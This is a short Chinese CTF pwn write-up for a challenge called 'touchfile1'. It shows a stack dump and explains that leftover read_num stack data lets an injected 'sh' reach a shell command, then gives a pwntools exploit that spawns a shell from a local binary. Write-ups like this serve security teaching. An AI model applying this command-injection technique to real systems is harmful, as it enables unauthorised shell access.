## touchfile1


***

出题人：xsh

![image-20240413224717995](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413224717995.png)

```
rsp   0x7ffea5dafc60 —▸ 0x561c2e99545c (main) ◂— endbr64 
01:0008│       0x7ffea5dafc68 —▸ 0x561c2e997d90 (__do_global_dtors_aux_fini_array_entry) —▸ 0x561c2e9951c0 (__do_global_dtors_aux) ◂— endbr64 
02:0010│ rsi-6 0x7ffea5dafc70 ◂— 0x206863756f74 /* 'touch ' */
03:0018│       0x7ffea5dafc78 ◂— 0x0
... ↓          2 skipped
06:0030│       0x7ffea5dafc90 ◂— 0xa68730a31 /* '1\nsh\n' */  # read_num 的栈残留
07:0038│       0x7ffea5dafc98 ◂— 0x403ecd5005a71300

```

调试会发现，我们写入的数据和 read_num 函数的栈数据残留相邻，因此可以通过在 read_num 函数写入 sh 执行以此绕过

exp

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = process('./touch_file1')
elf = ELF('./touch_file1')

#gdb.attach(p, 'b *$rebase(0x12c0)\n')

p.sendlineafter(b'> ', b'1' + b'\n' + b'sh')
p.sendlineafter(b'file_name: ', b'a'*0x1a)

p.interactive()
#pause()


```





